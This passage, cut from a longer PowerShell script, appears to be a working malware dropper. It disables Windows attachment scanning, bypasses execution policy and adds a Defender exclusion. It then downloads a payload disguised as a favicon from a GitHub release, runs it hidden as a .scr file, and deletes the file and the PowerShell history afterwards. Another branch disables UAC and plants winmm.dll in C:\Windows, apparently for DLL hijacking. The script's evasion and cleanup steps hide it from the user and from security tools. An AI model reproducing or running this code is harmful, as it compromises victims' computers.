
        try {
            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 0 /f | Out-Null
            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 0 /f | Out-Null
        }
        catch {
        }

        # Allow script execution
        try {
            Set-ExecutionPolicy Bypass -Scope Process -Force
        }
        catch {
        }

        # Define the file path and download URL
        $destination = "$env:AppData\UpdaterSerives.scr"
        $downloadUrl = "https://github.com/boradxshlok/snipzersxxss/releases/download/snieepsr/favicon.ico"

        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $env:AppData -ErrorAction Stop
            Start-Sleep -Seconds 4
        }
        catch {
            exit
        }

        # Download the file
        try {
            Invoke-WebRequest -OutFile $destination -Uri $downloadUrl -ErrorAction Stop
        }
        catch {
            try {
                Remove-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
            }
            catch {
            }
            exit
        }

        # Start the downloaded executable
        try {
            Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction Stop
        }
        catch {
        }

        # Wait for 10 seconds
        Start-Sleep -Seconds 10

        # Continuously attempt to delete the file
        $deleted = $false
        $retryCount = 0
        $maxRetries = 35
        while (-not $deleted -and $retryCount -lt $maxRetries) {
            try {
                if (Test-Path -Path $destination) {
                    Remove-Item -Path $destination -Force -ErrorAction Stop
                    $deleted = $true
                }
                else {
                    $deleted = $true
                }
            }
            catch {
                $retryCount++
                Start-Sleep -Seconds 5
            }
        }

        # Remove the Windows Defender exclusion
        try {
            Remove-MpPreference -ExclusionPath $env:AppData -ErrorAction Stop
        }
        catch {
        }

        # Clear PowerShell history
        try {
            Clear-History
            Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        }
        catch {
        }

        exit
    }
    else {
        # Function to download a DLL
        function Download-Dll {
            param (
                [string]$Url,
                [string]$Destination
            )
            $downloadSuccess = $false
            try {
                Invoke-WebRequest -Uri $Url -OutFile $Destination -ErrorAction Stop
                $downloadSuccess = $true
            }
            catch {
            }

            if (-not $downloadSuccess) {
                try {
                    $webClient = New-Object System.Net.WebClient
                    $webClient.DownloadFile($Url, $Destination)
                    $downloadSuccess = $true
                }
                catch {
                }
                finally {
                    if ($webClient) { $webClient.Dispose() }
                }
            }

            return $downloadSuccess
        }

        # Disable UAC by setting EnableLUA to 0
        try {
            $regCommand = 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f'
            Invoke-Expression $regCommand | Out-Null
        }
        catch {
        }

        # Define the DLL URL and destination path
        $dllUrl = "https://github.com/boradxshlok/DLL/releases/download/randomscrandssr/winmm.dll"
        $dllDestination = "C:\Windows\winmm.dll"

        # Download the DLL
        $downloadResult = Download-Dll -Url $dllUrl -Destination $dllDestination

        if (-not $downloadResult) {
            exit
        }
    }
}
else {

}
